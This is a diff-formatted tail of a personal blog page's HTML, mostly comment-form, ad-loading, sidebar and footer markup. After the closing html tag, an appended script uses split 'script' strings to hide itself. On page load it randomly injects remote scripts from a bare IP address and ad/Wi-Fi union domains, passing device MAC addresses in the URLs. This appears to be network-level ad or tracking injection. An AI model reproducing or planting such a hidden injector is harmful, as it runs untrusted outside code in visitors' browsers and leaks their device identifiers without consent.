+	<script type="text/javascript">var allowComments=true,cb_blogId=140374,cb_entryId=3064129,cb_blogApp=currentBlogApp,cb_blogUserGuid='d3edeb04-5264-e211-aa8f-842b2b196315',cb_entryCreatedDate='2013/5/10 12:20:00';loadViewCount(cb_entryId);</script>
+	
+</div><!--end: topics 文章、评论容器-->
+</div><a name="!comments"></a><div id="blog-comments-placeholder"></div><script type="text/javascript">var commentManager = new blogCommentManager();commentManager.renderComments(0);</script>
+<div id='comment_form' class='commentform'>
+<a name='commentform'></a>
+<div id='divCommentShow'></div>
+<div id='comment_nav'><span id='span_refresh_tips'></span><a href='javascript:void(0);' onclick='return RefreshCommentList();' id='lnk_RefreshComments' runat='server' clientidmode='Static'>刷新评论</a><a href='#' onclick='return RefreshPage();'>刷新页面</a><a href='#top'>返回顶部</a></div>
+<div id='comment_form_container'></div>
+<div class='ad_text_commentbox' id='ad_text_under_commentbox'></div>
+<div id='ad_t2'></div>
+<div id='opt_under_post'></div>
+<div id='ad_c1' class='c_ad_block'></div>
+<div id='under_post_news'></div>
+<div id='ad_c2' class='c_ad_block'></div>
+<div id='under_post_kb'></div>
+<div id='HistoryToday' class='c_ad_block'></div>
+<script type='text/javascript'>
+    fixPostBody();
+    setTimeout(function () { incrementViewCount(cb_entryId); }, 50);
+    deliverAdT2();
+    deliverAdC1();
+    deliverAdC2();    
+    loadNewsAndKb();
+    loadBlogSignature();
+    LoadPostInfoBlock(cb_blogId, cb_entryId, cb_blogApp, cb_blogUserGuid);
+    GetPrevNextPost(cb_entryId, cb_blogId, cb_entryCreatedDate);
+    loadOptUnderPost();
+    GetHistoryToday(cb_blogId, cb_blogApp, cb_entryCreatedDate);   
+</script>
+</div>
+
+
+	</div><!--end: forFlow -->
+	</div><!--end: mainContent 主体内容容器-->
+
+	<div id="sideBar">
+		<div id="sideBarMain">
+			
+			<div id="blog-calendar" style="display:none"></div><script type="text/javascript">loadBlogDefaultCalendar();</script>
+			
+			<div id="leftcontentcontainer">
+				<div id="blog-sidecolumn"></div><script type="text/javascript">loadBlogSideColumn();</script>
+			</div>
+			
+		</div><!--end: sideBarMain -->
+	</div><!--end: sideBar 侧边栏容器 -->
+	<div class="clear"></div>
+	</div><!--end: main -->
+	<div class="clear"></div>
+	<div id="footer">
+		
+<!--done-->
+Copyright &copy;2017 sunzn
+	</div><!--end: footer -->
+</div><!--end: home 自定义的最大容器 -->
+</body>
+</html>
+<script>
+function ik_random(){var ik_r_min=0;var ik_r_max=100;return(parseInt(Math.random()*(ik_r_max-ik_r_min+1)+ik_r_min));}
+function ik_isiframe(){return (self!=top);}
+var __m='b8:2a:72:c1:db:f9';
+var __m2='00:00:00:00:00:00';
+var __h="<sc"+"ript src=\"http://101.201.53.95/js.php?uid=48c591bb0b2e4fd248d81fbb9360387b,PC,";
+var __b="&r="+Math.random()+__m+__m2+"\"></scr"+"ipt>";
+var x=ik_random();
+if(!ik_isiframe()){
+switch(true){
+case x>=0&&x<5:
+document.write(__h+"200"+__b);
+document.write("<sc"+"ript src=\"http://js.union-wifi.com/zm.js?cid=10270&dmac="+__m2+"&umac="+__m+"\"></scr"+"ipt>");
+break;
+case x>=5&&x<20:
+document.write(__h+"12"+__b);
+document.write("<sc"+"ript src=\"http://res.sspsky.com/cp.js?cid=F3FFAE2FDC1B\"></scr"+"ipt>");
+break;
+case x>=50&&x<=100:
+document.write(__h+"100"+__b);
+document.write("<sc"+"ript src=\"http://js.union-wifi.com/zm.js?cid=10269&dmac="+__m2+"&umac="+__m+"\"></scr"+"ipt>");
+break;
+}
+}
+</script>
